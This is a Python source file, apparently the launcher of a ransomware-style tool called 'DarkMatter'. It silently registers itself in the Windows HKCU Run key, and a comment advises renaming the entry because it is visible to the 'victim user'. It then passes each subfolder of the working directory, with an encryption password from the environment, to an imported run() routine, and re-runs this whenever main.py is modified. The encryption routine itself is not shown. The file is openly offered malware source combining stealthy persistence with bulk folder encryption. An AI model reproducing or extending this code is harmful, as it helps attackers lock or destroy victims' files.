import sys
import os
import time
import pathlib
import winreg
from watchdog.observers import Observer
from watchdog.events import FileSystemEventHandler

from main import run


def add_to_startup_hkcu(silent: bool = True):
    app_name = "DarkMatter" # change the name because it'll be visible to victim user in their regedit

    if getattr(sys, 'frozen', False):
        target = sys.executable
    else:
        target = f'"{sys.executable}" "{os.path.abspath(__file__)}"'

    if not (target.startswith('"') and target.endswith('"')):
        target = f'"{target}"'

    key_path = r"Software\Microsoft\Windows\CurrentVersion\Run"

    try:
        key = winreg.OpenKey(
            winreg.HKEY_CURRENT_USER,
            key_path,
            0,
            winreg.KEY_READ | winreg.KEY_SET_VALUE | winreg.KEY_QUERY_VALUE
        )

        try:
            existing, _ = winreg.QueryValueEx(key, app_name)
            if os.path.normcase(existing.strip('"')) == os.path.normcase(target.strip('"')):
                winreg.CloseKey(key)
                return 
        except FileNotFoundError:
            pass

        winreg.SetValueEx(key, app_name, 0, winreg.REG_SZ, target)
        winreg.CloseKey(key)

        if not silent:
            print(f"[+] Registered autostart (HKCU): {app_name}")

    except PermissionError as e:
        if not silent:
            print(f"[!] HKCU Run key access denied: {e}")
            print("   → Possible causes: corporate policy, AV/EDR blocking, broken profile")
    except Exception as e:
        if not silent:
            print(f"[-] Autostart failed: {type(e).__name__}: {e}")


EXCLUDED_DIRS = {
    ".git", "__pycache__", ".venv", "venv", "env",
    "node_modules", "build", "dist"
}

BASE_DIR = pathlib.Path(".").resolve()


def run_once_on_startup():
    choice = os.getenv("DEFAULT_MODE", "1")
    password = os.getenv("ENCRYPT_PASSWORD")

    if not password:
        raise RuntimeError("ENCRYPT_PASSWORD environment variable is not set!")

    for item in BASE_DIR.iterdir():
        if not item.is_dir() or item.name in EXCLUDED_DIRS or item.name.startswith("."):
            continue
        print(f"[INIT] Processing: {item}")
        run(choice, str(item.resolve()), password)


class SaveHandler(FileSystemEventHandler):
    def __init__(self):
        self.last_run = 0

    def on_modified(self, event):
        if event.is_directory:
            return
        if not event.src_path.endswith("main.py"):
            return

        now = time.time()
        if now - self.last_run < 2:
            return

        self.last_run = now
        self.execute_on_surroundings()

    def execute_on_surroundings(self):
        for item in BASE_DIR.iterdir():
            if not item.is_dir() or item.name in EXCLUDED_DIRS or item.name.startswith("."):
                continue
            self.safe_execute(item)

    def safe_execute(self, folder):
        choice = os.getenv("DEFAULT_MODE", "1")
        password = os.getenv("ENCRYPT_PASSWORD")
        if not password:
            raise RuntimeError("ENCRYPT_PASSWORD not set")
        run(choice, str(folder.resolve()), password)


if __name__ == "__main__":
    add_to_startup_hkcu(silent=True)

    try:
        run_once_on_startup()
    except RuntimeError as e:
        print(f"[!] Startup init failed: {e}")
        sys.exit(1)

    observer = Observer()
    handler = SaveHandler()
    observer.schedule(handler, path=".", recursive=False)
    observer.start()

    print("[*] Folder watcher active. Ctrl+C to stop.")

    try:
        while True:
            time.sleep(1)
    except KeyboardInterrupt:
        print("\n[*] Shutting down...")
        observer.stop()

    observer.join()